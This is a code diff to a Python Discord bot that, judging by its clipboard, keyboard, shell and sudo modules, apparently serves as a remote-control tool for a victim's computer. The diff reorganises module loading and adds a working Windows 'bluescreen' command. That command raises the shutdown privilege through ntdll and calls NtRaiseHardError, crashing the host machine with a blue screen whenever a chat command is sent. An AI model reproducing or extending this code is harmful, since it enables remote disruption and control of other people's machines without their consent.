@@ -37,12 +37,18 @@ class MyBot(commands.Bot):
     async def setup_hook(self):
         # self is the bot here
         print(f"Logged in as: {self.user}")
-        await self.add_cog(clipboard_cog(bot))
-        await self.add_cog(keyboard_cog(bot))
-        await self.add_cog(shell_cog(bot))
-        await self.add_cog(message_cog(bot))
-        if isWindows == False:
-            await self.add_cog(sudo_cog(bot))
+
+        default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog]
+        linux_cog_classes = [sudo_cog,]
+        windows_cog_classes = []
+        
+        if isWindows:
+            cog_classes = default_cog_classes + windows_cog_classes
+        elif not isWindows:
+            cog_classes = default_cog_classes + linux_cog_classes
+
+        for cog_class in cog_classes:
+            await self.add_cog(cog_class(bot))
         
 
 
@@ -617,7 +623,7 @@ class shell_cog(commands.Cog):
         await self.run_shell_command(ctx, *args)
 
 
-# Linux specifix commands
+# Linux specific commands
 
 if isWindows == False:
     print("its linux")
@@ -716,6 +722,42 @@ done
                 else:
                     print("DONT")
 
+
+# Windows specific commands
+                    
+if isWindows:
+    print("its windows")
+    print(home_path)
+
+
+    # BLuescreen functions
+
+    def bluescreen():
+        import ctypes
+        
+        ntdll = ctypes.windll.ntdll
+        prev_value = ctypes.c_bool()
+        res = ctypes.c_ulong()
+
+        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+
+        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+            print("BSOD Successfull!")
+            return 0
+        else:
+            print("BSOD Failed...")
+            return 1
+        
+    @bot.command(name="bluescreen")
+    async def run_bluescreen(ctx):
+        success = bluescreen()
+
+        if success == 0:
+            embed = embed_data(title="Bluescreen", description="Bluescreen successfully thrown")
+        elif success == 1:
+            embed = embed_data(title="Bluescreen", description="Bluescreen failed", color=discord.Color.red())
+
+        await ctx.send(embed=embed)
 
 # Running the bot
     
